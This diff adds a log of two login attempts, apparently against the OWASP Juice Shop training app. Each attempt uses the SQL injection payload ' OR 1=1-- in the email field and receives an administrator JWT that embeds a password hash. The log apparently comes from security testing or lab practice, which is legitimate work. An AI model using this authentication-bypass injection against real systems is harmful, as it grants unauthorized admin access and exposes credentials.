@@ -1,0 +1,12 @@
+== LOGIN ATTEMPT ==
+Payload: {'email': "' OR 1=1--", 'password': 'THISDOESNTMATTER123'}
+Headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+Response: {'authentication': {'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDktMjUgMjA6MjY6MDkuNjIyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDktMjUgMjA6MjY6MDkuNjIyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1ODgzMjgxNX0.ScyyNZxBS1HmEqW9GO6riPLfFw5jvxwBve3P6kd1qFHAyYlpFjss4fNF12JY4xtsxWVVSnJkgssS1lyqsSaibnyBPSBIFlnk3CWyYcQbcPCF0DKzpMZ4tiNnRibO3OjdNMzf-ZyOvN9JPAEjFpxrWeURlb2nE0i0xholOgIX_Fc', 'bid': 1, 'umail': 'admin@juice-sh.op'}}
+Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...
+
+== LOGIN ATTEMPT ==
+Payload: {'email': "' OR 1=1--", 'password': 'THISDOESNTMATTER123'}
+Headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+Response: {'authentication': {'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDktMjUgMjA6MjY6MDkuNjIyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDktMjUgMjA6MjY6MDkuNjIyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1ODgzMzExMn0.nv59ge2LUS-576Cjo9z5JKja-P4Qh95lbq4uJAwKf2TsAMH4BpIQH0DFMO1wrOZ-jaZ6LlBGqAmK6AiMBYu5E4VAHbbaeEax5sV89NSmIn1Vc8hFTCWbEHq-6eNC7H76aEhZaOReSU_hNKmgiQW9afg_vywc0ObvMW69KaAzaPc', 'bid': 1, 'umail': 'admin@juice-sh.op'}}
+Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...
+
